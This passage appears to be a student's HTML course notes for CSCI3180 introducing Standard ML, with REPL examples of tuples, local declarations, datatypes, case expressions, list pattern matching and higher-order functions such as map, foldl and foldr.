<li>ML can infer the types of an expression without the user declaring any time  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sq(x) = x*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- <span class="keyword">fun</span> sq(x:<span class="built_in">real</span>) = x*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">fun</span> sq x = (x:<span class="built_in">real</span>)*x;</span><br><span class="line"><span class="keyword">val</span> sq = <span class="keyword">fn</span> : <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Conditional-Expression"><a href="#Conditional-Expression" class="headerlink" title="Conditional Expression"></a>Conditional Expression</h2><ul>
<li><p>Free standing conditional expression</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">if</span> (floor (<span class="number">323.43</span>*sin(<span class="number">1.0</span>)) mod <span class="number">2</span>) = <span class="number">0</span></span><br><span class="line">=     <span class="keyword">then</span> <span class="string">&quot;even&quot;</span> <span class="keyword">else</span> <span class="string">&quot;odd&quot;</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="string">&quot;even&quot;</span> : <span class="built_in">string</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Examples:</p>
<ul>
<li><p>Absolute value <code>abs</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> abs x = <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">then</span> x <span class="keyword">else</span> ~x;</span><br><span class="line"><span class="keyword">val</span> abs = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Check negative <code>negative</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> negative x = x &lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">val</span> negative = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Tuples"><a href="#Tuples" class="headerlink" title="Tuples"></a>Tuples</h2><ul>
<li><p>values can be combined into tuples</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> origin = (<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>);</span><br><span class="line"><span class="keyword">val</span> origin = (<span class="number">0.0</span>,<span class="number">0.0</span>,<span class="number">0.0</span>) : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">fun</span> length (x,y,z) = <span class="type">Math</span>.sqrt(x*x + y*y + z*z);</span><br><span class="line"><span class="keyword">val</span> length = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><font color="F54747"><strong>Note</strong></font>: every function in ML is <font color="F54747">one-argument function</font></p>
<ul>
<li>it looks like a multi-argument function, but the argument is just a tuple</li>
</ul>
</li>
</ul>
<h3 id="Selector-Functions"><a href="#Selector-Functions" class="headerlink" title="Selector Functions"></a>Selector Functions</h3><ul>
<li>it is used to explicitly select the components of a tuple</li>
<li>underscore <code>_</code> is the wildcard symbol used in <font color="3A75EA">pattern matching</font> (it would ignore the type)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> first (x,_,_) = x;</span><br><span class="line"><span class="keyword">val</span> first = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;a</span></span><br><span class="line">- <span class="keyword">fun</span> second (_,y,_) = y;</span><br><span class="line"><span class="keyword">val</span> second = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;b</span></span><br><span class="line">- <span class="keyword">fun</span> third (_,_,z) = z;</span><br><span class="line"><span class="keyword">val</span> third = <span class="keyword">fn</span> : <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;b</span> * <span class="symbol">&#x27;c</span> -&gt; <span class="symbol">&#x27;c</span></span><br><span class="line"></span><br><span class="line">- first(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">1</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Local-Declaration"><a href="#Local-Declaration" class="headerlink" title="Local Declaration"></a>Local Declaration</h2><ul>
<li><p>declare a value that have to be local in the function </p>
</li>
<li><p>Example: Area of a triangle<br>  $$ Area &#x3D; \sqrt{p(p-a)(p-b)(p-c)} \quad \text{where} \space p &#x3D; \frac{a+b+c}{2} $$</p>
<ul>
<li>given that $p$ can simplify a formula</li>
<li>since $p$ is only relevant for the computation of $Area$, it is suitable for setting $p$ to be local</li>
</ul>
</li>
<li><p>we can use <code>let</code> for local declaration</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> area (a,b,c) = <span class="keyword">let</span> <span class="keyword">val</span> p = (a+b+c)/<span class="number">2.0</span> <span class="keyword">in</span> </span><br><span class="line">=     sqrt(p*(p-a)*(p-b)*(p-c))</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">val</span> area = <span class="keyword">fn</span> : <span class="built_in">real</span> * <span class="built_in">real</span> * <span class="built_in">real</span> -&gt; <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line">- area (<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">0.0</span> : <span class="built_in">real</span></span><br><span class="line">- area (<span class="number">3.0</span>,<span class="number">4.0</span>,<span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Local declaration can be used in any expression (not just in function declaration)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* Use it in declaraing values *)</span></span><br><span class="line">- <span class="keyword">val</span> (a,b,c) = (<span class="number">3.0</span>,<span class="number">4.0</span>,<span class="number">5.0</span>);</span><br><span class="line"><span class="keyword">val</span> a = <span class="number">3.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="keyword">val</span> b = <span class="number">4.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="keyword">val</span> c = <span class="number">5.0</span> : <span class="built_in">real</span></span><br><span class="line">- <span class="keyword">let</span> <span class="keyword">val</span> p = (a+b+c)/<span class="number">2.0</span> <span class="keyword">in</span></span><br><span class="line">=     sqrt(p*(p-a)*(p-b)*(p-c))</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6.0</span> : <span class="built_in">real</span></span><br><span class="line"><span class="comment">(* Cannot access p *)</span></span><br><span class="line">p;  <span class="comment">(* ERROR *)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* local function declaration *)</span></span><br><span class="line">- <span class="keyword">fun</span> anniversary age =</span><br><span class="line">=     <span class="keyword">let</span> <span class="keyword">fun</span> divides (x,y) = x mod y = <span class="number">0</span> <span class="keyword">in</span></span><br><span class="line">=     divides(<span class="number">10</span>,age) <span class="keyword">orelse</span> divides(<span class="number">25</span>,age)</span><br><span class="line">= <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">val</span> anniversary = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- anniversary <span class="number">11</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br><span class="line">- anniversary <span class="number">5</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">true</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="User-Defined-Types"><a href="#User-Defined-Types" class="headerlink" title="User-Defined Types"></a>User-Defined Types</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><ul>
<li>ML supports user-defined types</li>
<li>following example is an enumeration type  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> <span class="type">DIRECTION</span> = <span class="type">North</span> | <span class="type">East</span> | <span class="type">South</span> | <span class="type">West</span>;</span><br><span class="line"><span class="keyword">datatype</span> <span class="type">DIRECTION</span> = <span class="type">East</span> | <span class="type">North</span> | <span class="type">South</span> | <span class="type">West</span></span><br><span class="line">- <span class="keyword">val</span> dir = <span class="type">East</span>;</span><br><span class="line"><span class="keyword">val</span> dir = <span class="type">East</span> : <span class="type">DIRECTION</span>  <span class="comment">(* dir is DIRECTION type *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Case-Expression"><a href="#Case-Expression" class="headerlink" title="Case Expression"></a>Case Expression</h3><ul>
<li>case expression is often used naturally in conjunction with enumeration types<ul>
<li><p>using <code>|</code> to seperate the different cases</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> dir = <span class="type">East</span>;</span><br><span class="line"><span class="keyword">val</span> dir = <span class="type">East</span> : <span class="type">DIRECTION</span>  <span class="comment">(* dir is DIRECTION type *)</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">case</span> dir <span class="keyword">of</span> <span class="type">North</span> =&gt; <span class="number">0</span></span><br><span class="line">=   |         <span class="type">East</span>  =&gt; <span class="number">90</span></span><br><span class="line">=   |         <span class="type">South</span> =&gt; <span class="number">180</span></span><br><span class="line">=   |         <span class="type">West</span>  =&gt; <span class="number">270</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example:</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> <span class="type">SUIT</span> = <span class="type">Spades</span> | <span class="type">Hearts</span> | <span class="type">Diamonds</span> | <span class="type">Clubs</span>;</span><br><span class="line"><span class="keyword">datatype</span> <span class="type">SUIT</span> = <span class="type">Clubs</span> | <span class="type">Diamonds</span> | <span class="type">Hearts</span> | <span class="type">Spades</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> gt_suit(_,<span class="type">Spades</span>) = <span class="literal">false</span>     <span class="comment">(* Spades is the largest *)</span></span><br><span class="line">=   | gt_suit(<span class="type">Spades</span>,_) = <span class="literal">true</span></span><br><span class="line">=   | gt_suit(<span class="type">Clubs</span>,_)  = <span class="literal">false</span>     <span class="comment">(* Clubs is the smallest *)</span></span><br><span class="line">=   | gt_suit(_,<span class="type">Clubs</span>)  = <span class="literal">true</span></span><br><span class="line">=   | gt_suit(s1,s2) = s1 = <span class="type">Hearts</span> <span class="keyword">andalso</span> s2 = <span class="type">Diamonds</span>;</span><br><span class="line"><span class="keyword">val</span> gt_suit = <span class="keyword">fn</span> : <span class="type">SUIT</span> * <span class="type">SUIT</span> -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> gt_card((s1,v1),(s2,v2)) =</span><br><span class="line">=    (v1:<span class="built_in">int</span>) &gt; v2 <span class="keyword">orelse</span></span><br><span class="line">= (v1 = v2 <span class="keyword">andalso</span> gt_suit(s1,s2));</span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> gt_card = <span class="keyword">fn</span> : (<span class="type">SUIT</span> * <span class="built_in">int</span>) * (<span class="type">SUIT</span> * <span class="built_in">int</span>) -&gt; <span class="built_in">bool</span> - gt_card((<span class="type">Clubs</span>,<span class="number">12</span>),(<span class="type">Spades</span>,<span class="number">12</span>));</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure>
<ul>
<li><font color="F54747"><strong>Noted</strong></font>: The order in case expression is <font color="F54747">very important</font>, because it has the <strong>checking order</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><ul>
<li>a data type that can represent different data types with same memory storage</li>
<li>we can define a union using <code>of</code> and <code>|</code>  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">datatype</span> num = i <span class="keyword">of</span> <span class="built_in">int</span> | r <span class="keyword">of</span> <span class="built_in">real</span>;</span><br><span class="line"><span class="keyword">datatype</span> num = i <span class="keyword">of</span> <span class="built_in">int</span> | r <span class="keyword">of</span> <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* Represents int for value a *)</span></span><br><span class="line">- <span class="keyword">val</span> a = i(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">val</span> a = i <span class="number">3</span> : num</span><br><span class="line"></span><br><span class="line"><span class="comment">(* Represents int for value b *)</span></span><br><span class="line">- <span class="keyword">val</span> b = r(<span class="number">4.0</span>);</span><br><span class="line"><span class="keyword">val</span> b = r <span class="number">4.0</span> : num</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Polymorphic"><a href="#Polymorphic" class="headerlink" title="Polymorphic"></a>Polymorphic</h3><ul>
<li>we can define polymorphic data types</li>
<li>we declare a binary tree using polymorphic data types (<code>&#39;a</code>)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">       <span class="comment">(* value, bTree         node     lTree   * root * rTree *)</span></span><br><span class="line">- <span class="keyword">datatype</span> <span class="symbol">&#x27;a</span> bTree = empty | node <span class="keyword">of</span> <span class="symbol">&#x27;a</span> bTree * <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;a</span> bTree;</span><br><span class="line"><span class="keyword">datatype</span> <span class="symbol">&#x27;a</span> bTree = empty | node <span class="keyword">of</span> <span class="symbol">&#x27;a</span> bTree * <span class="symbol">&#x27;a</span> * <span class="symbol">&#x27;a</span> bTree</span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> btMem(e,empty) = <span class="literal">false</span>    <span class="comment">(* if empty, false *)</span></span><br><span class="line">=   | btMem(e,node(left,r,right)) = e = r <span class="keyword">orelse</span>    <span class="comment">(* e == r which found *)</span></span><br><span class="line">=     btMem(e,left) <span class="keyword">orelse</span> btMem(e,right);  <span class="comment">(* recursively search for e *)</span></span><br><span class="line"><span class="keyword">val</span> btMem = <span class="keyword">fn</span> : <span class="string">&#x27;&#x27;</span>a * <span class="string">&#x27;&#x27;</span>a bTree -&gt; <span class="built_in">bool</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> t = node(node(empty,<span class="number">2</span>,node(empty,<span class="number">4</span>,empty)),</span><br><span class="line">=           <span class="number">1</span>,</span><br><span class="line">=           node(node(empty,<span class="number">5</span>,empty),<span class="number">3</span>,empty));</span><br><span class="line"><span class="keyword">val</span> t = node (node (empty,<span class="number">2</span>,node #),<span class="number">1</span>,node (node #,<span class="number">3</span>,empty)) : <span class="built_in">int</span> bTree</span><br><span class="line"></span><br><span class="line">- btMem(<span class="number">3</span>,t);</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">true</span> : <span class="built_in">bool</span></span><br><span class="line">- btMem(<span class="number">0</span>,t);</span><br><span class="line"><span class="keyword">val</span> it = <span class="literal">false</span> : <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul>
<li><code>[]</code> denotes empty list</li>
<li>Every non-empty tree contains<ol>
<li>The first element (<code>head</code>)</li>
<li>The list of remaining elements (<code>tail</code>)</li>
</ol>
</li>
</ul>
<h3 id="Combination"><a href="#Combination" class="headerlink" title="Combination"></a>Combination</h3><ul>
<li><p>we can combine the head and tail using the <font color="3A75EA">cons</font> operator <code>::</code>, written as <code>H::T</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="number">1</span> :: <span class="literal">[]</span>;</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line">- <span class="number">2</span> :: (<span class="number">1</span> :: <span class="literal">[]</span>);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">2</span>,<span class="number">1</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* It is the combination for head and tail only *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] :: <span class="number">4</span>;     <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>we can combine two lists using <code>@</code> operator (append)</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line">- it @ [<span class="number">7</span>,<span class="number">8</span>] @ [~<span class="number">9</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,~<span class="number">9</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Homogeneous"><a href="#Homogeneous" class="headerlink" title="Homogeneous"></a>Homogeneous</h3><ul>
<li><font color="F54747"><strong>Note</strong></font>: Lists in ML are <font color="F54747">homogeneous</font> elements of a list <font color="3A75EA">must be same type</font> (<font color="F54747">type sensitivity</font>)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* String Type *)</span></span><br><span class="line">- [<span class="string">&quot;husky&quot;</span>, <span class="string">&quot;shiba&quot;</span>];</span><br><span class="line"><span class="keyword">val</span> it = [<span class="string">&quot;husky&quot;</span>,<span class="string">&quot;shiba&quot;</span>] : <span class="built_in">string</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* [List] Type *)</span></span><br><span class="line">- <span class="keyword">val</span> l = [[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]];</span><br><span class="line"><span class="keyword">val</span> l = [[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]] : <span class="built_in">int</span> <span class="built_in">list</span> <span class="built_in">list</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] :: l;</span><br><span class="line"><span class="keyword">val</span> it = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]] : <span class="built_in">int</span> <span class="built_in">list</span> <span class="built_in">list</span></span><br><span class="line">- <span class="number">0</span> :: l;   <span class="comment">(* ERROR *)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* List combination *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ [<span class="number">4.0</span>, <span class="number">5.0</span>];     <span class="comment">(* ERROR *)</span></span><br><span class="line">- [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] @ <span class="number">2</span>   <span class="comment">(* ERROR *)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><ul>
<li>Build-in function <code>hd()</code> (get the head element) and <code>tl()</code> (get the remaining list)  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- hd([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">3</span> : <span class="built_in">int</span></span><br><span class="line">- tl([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- hd(tl(tl(tl([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]))));</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">6</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Pattern-Matching"><a href="#Pattern-Matching" class="headerlink" title="Pattern Matching"></a>Pattern Matching</h3><ul>
<li><p>using selectors <code>if-then-else</code> to implement summation</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sumList <span class="built_in">list</span> = <span class="keyword">if</span> null <span class="built_in">list</span> <span class="keyword">then</span> <span class="number">0</span>    <span class="comment">(* if this is empty, then 0 (return 0) *)</span></span><br><span class="line">=     <span class="keyword">else</span> hd(<span class="built_in">list</span>) + sumList(tl(<span class="built_in">list</span>));</span><br><span class="line"><span class="keyword">val</span> sumList = <span class="keyword">fn</span> : <span class="built_in">int</span> <span class="built_in">list</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- sumList([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">15</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>using pattern matching instead of selectors <code>if-then-else</code> to implement summation</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> sumList <span class="literal">[]</span> = <span class="number">0</span></span><br><span class="line">=   | sumList(a::<span class="built_in">list</span>) = a + sumList <span class="built_in">list</span>;  <span class="comment">(* like parsing them into a :: list *)</span></span><br><span class="line"><span class="keyword">val</span> sumList = <span class="keyword">fn</span> : <span class="built_in">int</span> <span class="built_in">list</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- sumList [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">10</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Higher-Order-Functions"><a href="#Higher-Order-Functions" class="headerlink" title="Higher-Order Functions"></a>Higher-Order Functions</h2><ul>
<li>functions that take functions as arguments and&#x2F;or produce functions as values (because function is actually a value)<ul>
<li>the function <code>double</code> takes <code>f</code> as input (argument) and <em>return</em> another function that always return twice the result of <code>f</code>  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* fucntion name: double, f: the argument of double *)</span></span><br><span class="line">- <span class="keyword">fun</span> double f = <span class="keyword">fn</span> x =&gt; <span class="number">2</span> * f(x);</span><br><span class="line"><span class="keyword">val</span> double = <span class="keyword">fn</span> : (<span class="symbol">&#x27;a</span> -&gt; <span class="built_in">int</span>) -&gt; <span class="symbol">&#x27;a</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">(* Delcare the function that be the argument in double *)</span></span><br><span class="line">- <span class="keyword">fun</span> inc x = x + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">val</span> inc = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- <span class="keyword">fun</span> inc2 x = x + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">val</span> inc2 = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">- double inc <span class="number">3</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">8</span> : <span class="built_in">int</span>    <span class="comment">(* (3+1) * 2 *)</span></span><br><span class="line">- double inc2 <span class="number">3</span>;</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">10</span> : <span class="built_in">int</span>   <span class="comment">(* (3+2) * 2 *)</span></span><br><span class="line">- double inc;</span><br><span class="line"><span class="keyword">val</span> it = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><ul>
<li>map function that takes as input a function <code>f</code> and a list <code>[a1, ..., an]</code>, and produces the list <code>[f(a1), ..., f(an)]</code> as output  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line"><span class="comment">(* parse the list into x + [xs], then f(x)::map(f, xs) *)</span></span><br><span class="line">- <span class="keyword">fun</span> map(f,<span class="literal">[]</span>) = <span class="literal">[]</span></span><br><span class="line">=   | map(f,x::xs) = f(x)::map(f,xs);</span><br><span class="line"><span class="keyword">val</span> map = <span class="keyword">fn</span> : (<span class="symbol">&#x27;a</span> -&gt; <span class="symbol">&#x27;b</span>) * <span class="symbol">&#x27;a</span> <span class="built_in">list</span> -&gt; <span class="symbol">&#x27;b</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">fun</span> inc x = x + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">val</span> inc = <span class="keyword">fn</span> : <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- map(inc,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">val</span> it = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="foldl-amp-foldr"><a href="#foldl-amp-foldr" class="headerlink" title="foldl &amp; foldr"></a><code>foldl</code> &amp; <code>foldr</code></h3><ul>
<li><p>It takes as input a function <code>f</code>, an initial value <code>x</code>, and a list <code>[a1, ..., an]</code></p>
</li>
<li><p><code>foldl</code> produces as output the value <code>f(an, f(an-1, ... , f(a2, f(a1, x))))</code></p>
</li>
<li><p><code>foldr</code> produces as output the value <code>f(a1, f(a2, ... f(an-1, f(an, x)...)))</code></p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> add(x,y) = x + y;     <span class="comment">(* It is necessary to use tuple be argument when using foldl *)</span></span><br><span class="line"><span class="keyword">val</span> add = <span class="keyword">fn</span> : <span class="built_in">int</span> * <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- foldl add <span class="number">1</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">val</span> it = <span class="number">15</span> : <span class="built_in">int</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Note that the following implementation is wrong as foldl does not expect take 2 arguments for the function f</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">fun</span> add x y = x + y;</span><br><span class="line"><span class="keyword">val</span> add = <span class="keyword">fn</span> : <span class="built_in">int</span> * <span class="built_in">int</span> -&gt; <span class="built_in">int</span></span><br><span class="line">- foldl add <span class="number">1</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];        <span class="comment">(* Error *)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>We can use the functions in other packages</p>
  <figure class="highlight sml"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">val</span> <span class="type">L</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">val</span> <span class="type">L</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] : <span class="built_in">int</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> real_nums = map <span class="built_in">real</span> <span class="type">L</span>;</span><br><span class="line"><span class="keyword">val</span> real_nums = [<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>,<span class="number">4.0</span>] : <span class="built_in">real</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> r = foldl <span class="type">Math</span>.pow <span class="number">1.0</span> real_nums;     <span class="comment">(* foldl: pow(4, pow(3, pow(2, pow(1, 1)))) *)</span></span><br><span class="line"><span class="keyword">val</span> r = <span class="number">262144.0</span> : <span class="built_in">real</span></span><br><span class="line"></span><br><span class="line">- <span class="keyword">val</span> r = foldr <span class="type">Math</span>.pow <span class="number">1.0</span> real_nums;     <span class="comment">(* foldr: pow(1, pow(2, pow(3, pow(4, 1)))) *)</span></span><br><span class="line"><span class="keyword">val</span> r = <span class="number">1.0</span> : <span class="built_in">real</span></span><br></pre></td></tr></table></figure></li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
